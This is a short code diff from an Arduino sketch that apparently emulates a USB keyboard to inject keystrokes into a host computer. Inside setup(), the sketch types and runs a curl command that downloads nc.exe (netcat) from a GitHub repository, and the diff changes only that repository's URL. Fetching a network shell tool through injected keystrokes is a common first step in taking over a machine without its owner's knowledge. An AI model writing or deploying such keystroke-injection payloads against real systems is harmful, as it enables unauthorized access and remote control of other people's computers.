@@ -26,7 +26,7 @@ void setup()
 
   delay(100);
 
-  Keyboard.print("curl https://raw.githubusercontent.com/77697a65/Tools/master/nc.exe > nc.exe");
+  Keyboard.print("curl https://raw.githubusercontent.com/77697a65/The-Wize-Toolbox/master/nc.exe > nc.exe");
 
   typeKey(KEY_RETURN);
   
